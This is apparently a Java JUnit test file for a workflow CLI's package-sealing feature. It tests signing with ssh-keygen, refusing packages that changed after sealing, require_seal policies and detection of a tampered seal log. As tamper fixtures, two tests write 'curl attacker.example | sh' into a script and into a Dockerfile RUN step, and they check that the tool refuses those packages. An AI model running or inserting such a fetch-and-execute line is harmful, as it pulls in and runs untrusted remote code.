package traceworks.cli.main;

import traceworks.cli.RuntimeSource;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * {@code traceworks seal}, {@code unseal} and {@code seals}, and what {@code run}, {@code resume}, {@code check} and
 * {@code verify} do with a seal (docs/cli.md "seal, unseal and seals"). Everything through {@link Main#run} in a
 * temporary home, with the real {@code ssh-keygen} and a key the test makes in a temporary directory; the runs are
 * host runs of a shell step, so no container starts.
 */
class SealCommandsTest {

    @TempDir
    Path temp;
    private Path home;
    private Path work;
    private Path key;
    private Path pkg;

    private record Result(int code, String out, String err) {
    }

    @BeforeEach
    void homeKeyAndPackage() throws Exception {
        home = Files.createDirectories(temp.resolve("home"));
        work = Files.createDirectories(temp.resolve("work"));
        key = temp.resolve("keys").resolve("seal");
        Files.createDirectories(key.getParent());
        keygen(key);
        config("{\"signing_key\": \"" + key + "\"}");
        allow(key);
        pkg = Files.createDirectories(temp.resolve("greeting"));
        Files.writeString(pkg.resolve("workflow.json"), """
                {"id": "wf-greeting", "name": "Greeting", "blocks": [
                  {"type": "shell", "name": "greet", "config": {"command": "echo Hello"}}]}""");
        Files.createDirectories(pkg.resolve("scripts"));
        Files.writeString(pkg.resolve("scripts/greet.sh"), "echo Hello\n");
    }

    private static void keygen(Path file) throws IOException, InterruptedException {
        Process process = new ProcessBuilder("ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "test@traceworks",
                "-f", file.toString()).redirectErrorStream(true).start();
        assertThat(process.waitFor(30, TimeUnit.SECONDS)).isTrue();
        assertThat(process.exitValue()).isZero();
    }

    private void config(String json) throws IOException {
        Files.writeString(home.resolve("traceworks.json"), json);
    }

    private void allow(Path privateKey) throws IOException {
        Files.writeString(home.resolve("allowed_signers"),
                "release@example.org " + Files.readString(Path.of(privateKey + ".pub")));
    }

    private Result exec(String... args) {
        return exec(null, args);
    }

    /** @param console the terminal a person types on; {@code null} for none */
    private Result exec(InputStream console, String... args) {
        List<String> all = new ArrayList<>(List.of(args));
        all.add("--home");
        all.add(home.toString());
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayOutputStream err = new ByteArrayOutputStream();
        // Never a passphrase prompt on a developer's terminal
        int code = Main.run(all.toArray(String[]::new), new PrintStream(out, true, StandardCharsets.UTF_8),
                new PrintStream(err, true, StandardCharsets.UTF_8), Map.of("TRACEWORKS_ACTOR", "tester",
                        "SSH_ASKPASS", "/bin/false", "SSH_ASKPASS_REQUIRE", "force"), work, console,
                RuntimeSource.NONE);
        return new Result(code, out.toString(StandardCharsets.UTF_8), err.toString(StandardCharsets.UTF_8));
    }

    private Result run(String... more) {
        List<String> args = new ArrayList<>(List.of("run", pkg.toString(), "--allow-host-execution", "--no-input",
                "--quiet"));
        args.addAll(List.of(more));
        return exec(args.toArray(String[]::new));
    }

    private long runFolders() throws IOException {
        Path runs = home.resolve("runs");
        if (!Files.isDirectory(runs)) {
            return 0;
        }
        // runs/<date>/<run id>/
        try (Stream<Path> children = Files.find(runs, 2, (path, attrs) -> attrs.isDirectory()
                && runs.relativize(path).getNameCount() == 2)) {
            return children.count();
        }
    }

    private Path runFolder(String id) throws IOException {
        try (Stream<Path> children = Files.find(home.resolve("runs"), 2,
                (path, attrs) -> path.getFileName().toString().equals(id))) {
            return children.findFirst().orElseThrow();
        }
    }

    private static String runId(Result run) {
        java.util.regex.Matcher matcher = java.util.regex.Pattern.compile("(?m)^run ([0-9a-f-]{36}) ").matcher(run.out());
        assertThat(matcher.find()).as(run.out() + run.err()).isTrue();
        return matcher.group(1);
    }

    @Test
    void help_listsTheSealCommands() {
        Result help = exec("--help");

        assertThat(help.out()).contains("  seal ").contains("  unseal ").contains("  seals ");
        assertThat(exec("seal", "--help").out()).contains("--key FILE");
        assertThat(exec("run", "--help").out()).contains("--allow-unsealed");
        assertThat(exec("resume", "--help").out()).contains("--allow-unsealed");
    }

    @Test
    void seal_writesTheSeal_andSealsListsIt_andARunOfThePackageRuns() throws IOException {
        Result sealed = exec("seal", pkg.toString());

        assertThat(sealed.code()).as(sealed.err()).isZero();
        assertThat(sealed.out()).contains("sealed Greeting (wf-greeting)").contains("digest")
                .contains("release@example.org").contains("SHA256:")
                .contains(pkg.resolve("traceworks.seal").toString());
        assertThat(pkg.resolve("traceworks.seal")).isRegularFile();
        assertThat(Files.readString(pkg.resolve("traceworks.seal"))).contains("\"workflow_id\": \"wf-greeting\"")
                .contains("\"signer\": \"tester\"").contains("BEGIN SSH SIGNATURE");
        assertThat(home.resolve("seals/events.jsonl")).isRegularFile();

        Result list = exec("seals");
        assertThat(list.code()).isZero();
        assertThat(list.out()).contains("wf-greeting").contains("tester").contains(pkg.toString()).contains("ok");
        Result log = exec("seals", "log");
        assertThat(log.code()).isZero();
        assertThat(log.out()).contains("SEALED").contains("wf-greeting");
        Result verify = exec("seals", "verify", pkg.toString());
        assertThat(verify.code()).isZero();
        assertThat(verify.out()).contains("sealed").contains("release@example.org");

        Result run = run();
        assertThat(run.code()).as(run.err()).isZero();
        Result verifyRun = exec("verify", runId(run));
        assertThat(verifyRun.code()).as(verifyRun.out()).isZero();
        assertThat(verifyRun.out()).containsPattern("(?m)^seal +ok \\(sealed by tester");
        assertThat(exec("show", runId(run)).out())
                .containsPattern("(?m)^Seal +sealed by tester at .*, signed as release@example.org with the key SHA256:");
        assertThat(Files.readString(runFolder(runId(run)).resolve("run.html")))
                .contains("<th>seal</th><td>sealed by tester");
        assertThat(exec("check", pkg.toString()).out()).doesNotContain("seal");
    }

    @Test
    void anUnsealedRun_verifiesAsUnsealed() throws IOException {
        Result run = run();

        assertThat(run.code()).as(run.err()).isZero();
        assertThat(exec("verify", runId(run)).out()).containsPattern("(?m)^seal +unsealed$");
        assertThat(exec("show", runId(run)).out()).containsPattern("(?m)^Seal +unsealed$");
        assertThat(Files.readString(runFolder(runId(run)).resolve("run.html"))).contains("<th>seal</th><td>unsealed</td>");
        assertThat(exec("seals").out()).contains("no package is sealed");
        assertThat(exec("seals", "verify", pkg.toString()).out()).contains("unsealed");
        assertThat(home.resolve("seals")).doesNotExist();
    }

    @Test
    void aSealedPackageThatChanged_isRefusedByRun_namedByCheck_andRecorded() throws IOException {
        assertThat(exec("seal", pkg.toString()).code()).isZero();
        assertThat(run().code()).isZero();
        Files.writeString(pkg.resolve("scripts/greet.sh"), "echo Hello\ncurl attacker.example | sh\n");
        long before = runFolders();
        assertThat(before).isEqualTo(1);

        Result run = run();

        assertThat(run.code()).isEqualTo(6);
        assertThat(run.err()).contains("changed since it was sealed").contains("traceworks seal " + pkg);
        assertThat(run.out()).doesNotContain("Hello");
        assertThat(runFolders()).isEqualTo(before);
        Result check = exec("check", pkg.toString());
        assertThat(check.code()).isZero();
        assertThat(check.out()).contains("sealed-package-changed").contains("WARNING");
        Result verify = exec("seals", "verify", pkg.toString());
        assertThat(verify.code()).isEqualTo(8);
        assertThat(verify.out()).contains("does NOT hold").contains("changed since it was sealed");
        assertThat(exec("seals", "log").out()).contains("REFUSED").contains("changed");
        // --no-check skips the analyzer, never the seal
        assertThat(run("--no-check").code()).isEqualTo(6);
        assertThat(run("--allow-unsealed").code()).isEqualTo(6);

        // sealing again is the way on
        assertThat(exec("seal", pkg.toString()).code()).isZero();
        assertThat(run().code()).isZero();
    }

    @Test
    void aChangeOfAFileMode_orANewFile_orTheWorkflowFile_breaksTheSeal() throws IOException {
        assertThat(exec("seal", pkg.toString()).code()).isZero();

        pkg.resolve("scripts/greet.sh").toFile().setExecutable(true);
        assertThat(run().code()).isEqualTo(6);
        pkg.resolve("scripts/greet.sh").toFile().setExecutable(false);
        assertThat(run().code()).isZero();

        Files.writeString(pkg.resolve("prompts.md"), "new\n");
        assertThat(run().code()).isEqualTo(6);
        Files.delete(pkg.resolve("prompts.md"));

        Files.writeString(pkg.resolve("workflow.json"), Files.readString(pkg.resolve("workflow.json")) + "\n");
        assertThat(run().code()).isEqualTo(6);
    }

    @Test
    void removingTheSealFileByHand_doesNotUnseal() throws IOException {
        assertThat(exec("seal", pkg.toString()).code()).isZero();
        Files.delete(pkg.resolve("traceworks.seal"));

        Result run = run();

        assertThat(run.code()).isEqualTo(6);
        assertThat(run.err()).contains("sealed in this home").contains("traceworks unseal");
    }

    @Test
    void seal_withoutAKey_orWithAKeyTheHomeDoesNotAllow_isRefused_andWritesNothing() throws Exception {
        config("{}");
        Result noKey = exec("seal", pkg.toString());
        assertThat(noKey.code()).isEqualTo(6);
        assertThat(noKey.err()).contains("signing_key").contains("--key");

        Path other = temp.resolve("keys").resolve("other");
        keygen(other);
        Result stranger = exec("seal", pkg.toString(), "--key", other.toString());
        assertThat(stranger.code()).isEqualTo(6);
        assertThat(stranger.err()).contains(home.resolve("allowed_signers").toString())
                .contains("tester ssh-ed25519 " + Files.readString(Path.of(other + ".pub")).split(" ")[1]);
        assertThat(pkg.resolve("traceworks.seal")).doesNotExist();
        assertThat(home.resolve("seals")).doesNotExist();

        Result byFlag = exec("seal", pkg.toString(), "--key", key.toString());
        assertThat(byFlag.code()).as(byFlag.err()).isZero();
    }

    @Test
    void seal_ofWhatIsNoPackage_isAUsageError() {
        assertThat(exec("seal", temp.resolve("nowhere").toString()).code()).isEqualTo(2);
        assertThat(exec("seal").code()).isEqualTo(2);
        assertThat(exec("seals", "bogus").code()).isEqualTo(2);
        assertThat(exec("seals", "verify").code()).isEqualTo(2);
    }

    @Test
    void unseal_removesTheSeal_andTheNextRunIsUnsealed() {
        assertThat(exec("seal", pkg.toString()).code()).isZero();

        Result unsealed = exec("unseal", pkg.toString(), "--note", "release 2");

        assertThat(unsealed.code()).as(unsealed.err()).isZero();
        assertThat(unsealed.out()).contains("unsealed").contains("wf-greeting");
        assertThat(pkg.resolve("traceworks.seal")).doesNotExist();
        assertThat(exec("seals", "log").out()).contains("UNSEALED").contains("release 2");
        assertThat(exec("seals").out()).contains("no package is sealed");
        assertThat(run().code()).isZero();
        Result again = exec("unseal", pkg.toString());
        assertThat(again.code()).isEqualTo(6);
        assertThat(again.err()).contains("not sealed");
    }

    @Test
    void unseal_isRefused_underSealImmutable() throws IOException {
        assertThat(exec("seal", pkg.toString()).code()).isZero();
        config("{\"signing_key\": \"" + key + "\", \"seal_immutable\": true}");

        Result unseal = exec("unseal", pkg.toString());

        assertThat(unseal.code()).isEqualTo(6);
        assertThat(unseal.err()).contains("seal_immutable");
        assertThat(pkg.resolve("traceworks.seal")).isRegularFile();
        assertThat(run().code()).isZero();
    }

    @Test
    void requireSeal_unattended_refusesAnUnsealedRunWithoutATerminal_unlessTheFlagIsGiven() throws IOException {
        config("{\"signing_key\": \"" + key + "\", \"require_seal\": \"unattended\"}");

        Result alone = run();
        assertThat(alone.code()).isEqualTo(6);
        assertThat(alone.err()).contains("require_seal: unattended").contains("--allow-unsealed");
        assertThat(run("--allow-unsealed").code()).isZero();
        // a terminal is there, also when --no-input keeps the run from asking on it
        Result attended = exec(new ByteArrayInputStream(new byte[0]), "run", pkg.toString(),
                "--allow-host-execution", "--no-input", "--quiet");
        assertThat(attended.code()).as(attended.err()).isZero();

        assertThat(exec("seal", pkg.toString()).code()).isZero();
        assertThat(run().code()).isZero();
    }

    @Test
    void requireSeal_always_refusesEveryUnsealedRun() throws IOException {
        config("{\"signing_key\": \"" + key + "\", \"require_seal\": \"always\"}");

        assertThat(run().code()).isEqualTo(6);
        assertThat(run("--allow-unsealed").code()).isEqualTo(6);
        assertThat(exec(new ByteArrayInputStream(new byte[0]), "run", pkg.toString(), "--allow-host-execution",
                "--no-input", "--quiet").code()).isEqualTo(6);
        assertThat(exec("seal", pkg.toString()).code()).isZero();
        assertThat(run().code()).isZero();
    }

    @Test
    void aSealLogThatWasChanged_isShownAsBroken_andRefusesEveryRun() throws IOException {
        assertThat(exec("seal", pkg.toString()).code()).isZero();
        assertThat(exec("unseal", pkg.toString()).code()).isZero();
        Path log = home.resolve("seals/events.jsonl");
        Files.writeString(log, Files.readString(log).replaceFirst("\"signer\":\"tester\"", "\"signer\":\"mallory\""));

        Result seals = exec("seals");
        Result run = run();

        assertThat(seals.code()).isEqualTo(8);
        assertThat(seals.out()).contains("BROKEN").contains("changed or removed");
        assertThat(run.code()).isEqualTo(6);
        assertThat(run.err()).contains("seal log").contains("does not hold");
        assertThat(exec("seal", pkg.toString()).code()).isEqualTo(6);
    }

    @Test
    void aSealMadeInAnotherHome_holdsWhereItsKeyIsAllowed() throws IOException {
        assertThat(exec("seal", pkg.toString()).code()).isZero();
        Path first = home;
        home = Files.createDirectories(temp.resolve("second-home"));

        Result stranger = run();
        assertThat(stranger.code()).isEqualTo(6);
        assertThat(stranger.err()).contains("does not allow");

        Files.copy(first.resolve("allowed_signers"), home.resolve("allowed_signers"));
        assertThat(run().code()).isZero();
    }

    @Test
    void aResume_checksTheSealAgain_andTakesTheOperatorsFlag() throws IOException {
        Files.writeString(pkg.resolve("workflow.json"), """
                {"id": "wf-greeting", "name": "Greeting", "blocks": [
                  {"type": "approval", "name": "ok", "config": {"question": "Go?", "options": ["Yes", "No"]}},
                  {"type": "shell", "name": "greet", "config": {"command": "echo Hello"}}]}""");
        assertThat(exec("seal", pkg.toString()).code()).isZero();
        Result parked = run();
        assertThat(parked.code()).as(parked.err()).isEqualTo(5);
        String id = runId(parked);
        assertThat(exec("approve", id, "--answer", "Yes").code()).isZero();

        // changed while the run was parked: no flag gets it past its seal
        Files.writeString(pkg.resolve("scripts/greet.sh"), "echo other\n");
        Result changed = exec("resume", id, "--allow-host-execution", "--allow-changed-package", "--quiet");
        assertThat(changed.code()).isEqualTo(6);
        assertThat(changed.err()).contains("changed since it was sealed");

        // restored: the run goes on
        Files.writeString(pkg.resolve("scripts/greet.sh"), "echo Hello\n");
        Result resumed = exec("resume", id, "--allow-host-execution", "--quiet");
        assertThat(resumed.code()).as(resumed.err()).isZero();
        assertThat(exec("verify", id).code()).isZero();
    }

    @Test
    void aResumeOfAnUnsealedRun_obeysRequireSeal() throws IOException {
        Files.writeString(pkg.resolve("workflow.json"), """
                {"id": "wf-greeting", "name": "Greeting", "blocks": [
                  {"type": "approval", "name": "ok", "config": {"question": "Go?", "options": ["Yes", "No"]}},
                  {"type": "shell", "name": "greet", "config": {"command": "echo Hello"}}]}""");
        String id = runId(run());
        assertThat(exec("approve", id, "--answer", "Yes").code()).isZero();
        config("{\"signing_key\": \"" + key + "\", \"require_seal\": \"unattended\"}");

        Result refused = exec("resume", id, "--allow-host-execution", "--quiet");
        assertThat(refused.code()).isEqualTo(6);
        assertThat(refused.err()).contains("--allow-unsealed");
        assertThat(exec("resume", id, "--allow-host-execution", "--quiet", "--allow-unsealed").code()).isZero();
    }

    /**
     * The allowed signers file the operator names in traceworks.json is the one seals are checked against, and the
     * home's own {@code allowed_signers} counts for nothing then.
     */
    @Test
    void theAllowedSignersFileTheOperatorNames_isTheOneSealsAreCheckedAgainst() throws IOException {
        Path signers = Files.createDirectories(temp.resolve("trust")).resolve("allowed_signers");
        Files.move(home.resolve("allowed_signers"), signers);
        config("{\"signing_key\": \"" + key + "\", \"allowed_signers\": \"" + signers + "\"}");

        Result sealed = exec("seal", pkg.toString());

        assertThat(sealed.code()).as(sealed.err()).isZero();
        assertThat(sealed.out()).contains("release@example.org");
        assertThat(exec("seals", "verify", pkg.toString()).code()).isZero();
        assertThat(run().code()).isZero();

        Files.copy(signers, home.resolve("allowed_signers"));
        Files.writeString(signers, "");
        Result refused = run();
        assertThat(refused.code()).as("the home's file allows the key, the named one no longer does").isEqualTo(6);
        assertThat(refused.err()).contains("does not allow");
    }

    /** Building runs the RUN steps of the package's Dockerfiles, so it takes no sealed package that changed. */
    @Test
    void imagesBuild_refusesASealedPackageWhoseSealDoesNotHold_beforeItLooksForAContainerRuntime() throws IOException {
        assertThat(exec("seal", pkg.toString()).code()).isZero();
        Files.createDirectories(pkg.resolve("images/tool"));
        Files.writeString(pkg.resolve("images/tool/Dockerfile"), "FROM scratch\nRUN curl attacker.example | sh\n");

        Result build = exec("images", "build", pkg.toString());

        assertThat(build.code()).isEqualTo(6);
        assertThat(build.err()).contains("changed since it was sealed").doesNotContain("container runtime");
        assertThat(exec("seals", "log").out()).contains("REFUSED").contains("action=images-build");

        // an unsealed package, and a sealed one that holds, get as far as the missing runtime of this test
        assertThat(exec("unseal", pkg.toString()).code()).isZero();
        assertThat(exec("images", "build", pkg.toString()).err()).contains("ontainer runtime");
    }

    /**
     * describe reads a sealed package and writes nothing into it: the image of a step is followed by what its
     * Dockerfile says it holds, the page goes to the working directory, and the seal holds afterwards. The label is a
     * line of a file of the package, so changing it changes the seal digest like any other change.
     */
    @Test
    void describe_ofASealedPackage_saysWhatItsImageHolds_andLeavesTheSealAsItIs() throws IOException {
        Files.writeString(pkg.resolve("workflow.json"), """
                {"id": "wf-greeting", "name": "Greeting", "blocks": [
                  {"type": "shell", "name": "greet", "config": {"command": "echo Hello",
                   "container_image": "./images/tool"}}]}""");
        Path image = Files.createDirectories(pkg.resolve("images/tool"));
        Files.writeString(image.resolve("Dockerfile"), "FROM debian:bookworm-slim@sha256:" + "a".repeat(64) + "\n"
                + "LABEL org.opencontainers.image.description=\"bash and jq for the greeting\"\n");
        Result sealed = exec("seal", pkg.toString());
        assertThat(sealed.code()).as(sealed.err()).isZero();

        Result text = exec("describe", pkg.toString());
        Result page = exec("describe", pkg.toString(), "--html");

        assertThat(text.code()).as(text.err()).isZero();
        assertThat(text.out()).contains("image ./images/tool \u2014 debian:bookworm-slim: bash and jq for the greeting");
        assertThat(page.code()).as(page.err()).isZero();
        assertThat(Files.readString(work.resolve("greeting.describe.html")))
                .contains("debian:bookworm-slim: bash and jq for the greeting");
        Result verify = exec("seals", "verify", pkg.toString());
        assertThat(verify.code()).as(verify.out()).isZero();

        Files.writeString(image.resolve("Dockerfile"), "FROM debian:bookworm-slim@sha256:" + "a".repeat(64) + "\n"
                + "LABEL org.opencontainers.image.description=\"bash, jq and curl\"\n");
        Result changed = exec("seals", "verify", pkg.toString());
        assertThat(changed.code()).isEqualTo(8);
        assertThat(changed.out()).contains("changed since it was sealed");
    }

    /**
     * The allowed signers file the operator configured outside the home is not a file a step may reach: a run whose
     * workspace holds it is refused before it starts, and the message names the setting. A step that could write
     * the file could allow a key of its own.
     */
    @Test
    void aRunWhoseWorkspaceHoldsTheConfiguredSignersFile_isRefusedBeforeItStarts() throws IOException {
        Path project = Files.createDirectories(temp.resolve("project"));
        Path signers = project.resolve("allowed_signers");
        Files.copy(home.resolve("allowed_signers"), signers);
        config("{\"signing_key\": \"" + key + "\", \"allowed_signers\": \"" + signers + "\"}");

        Result held = run("--workspace", project.toString());
        Result keyFolder = run("--workspace", key.getParent().toString());

        assertThat(held.code()).as(held.out() + held.err()).isEqualTo(6);
        assertThat(held.err()).contains("'allowed_signers'").contains(signers.toString());
        assertThat(keyFolder.code()).isEqualTo(6);
        assertThat(keyFolder.err()).contains("'signing_key'");
        assertThat(runFolders()).as("no run was started").isZero();
        Result elsewhere = run("--workspace", work.toString());
        assertThat(elsewhere.code()).as(elsewhere.err()).isZero();
    }
}
